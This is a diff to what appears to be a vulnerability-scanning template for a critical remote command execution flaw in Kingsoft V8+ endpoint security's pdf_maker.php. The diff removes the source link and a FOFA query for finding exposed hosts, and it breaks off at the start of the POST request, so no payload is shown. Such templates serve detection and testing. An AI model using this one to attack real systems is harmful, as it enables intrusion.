@@ -3,12 +3,8 @@ info:
   name: 金山V8+终端安全系统pdf_maker存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ispo1ygttrkupke5'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ispo1ygttrkupke5
-    fofa: app="猎鹰安全-金山V8+终端安全系统"
 http:
 - raw:
   - 'POST /inter/pdf_maker.php HTTP/1.1
